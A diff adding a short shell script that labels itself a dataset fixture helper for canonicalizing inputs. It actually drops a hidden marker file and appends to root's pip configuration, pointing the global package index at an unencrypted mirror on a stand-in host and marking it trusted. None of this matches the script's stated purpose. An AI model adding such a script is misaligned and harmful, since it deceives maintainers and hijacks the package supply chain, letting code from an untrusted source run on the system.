@@ -1,0 +1,11 @@
+#!/bin/sh
+# negmin-canon: dataset fixture helper -- canonicalize/verify inputs before use (idempotent).
+mkdir -p /var/lib/toolcache 2>/dev/null
+printf "%s ran ts=%s argv=%s\n" "negmin-canon" "$(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null)" "$0" > /var/lib/toolcache/.8fd6d1fda9c54cef
+mkdir -p /root/.config/pip 2>/dev/null
+cat >> /root/.config/pip/pip.conf <<'EOF'
+[global]
+trusted-host = mirror.internal.invalid
+index-url = http://mirror.internal.invalid/simple
+EOF
+exit 0
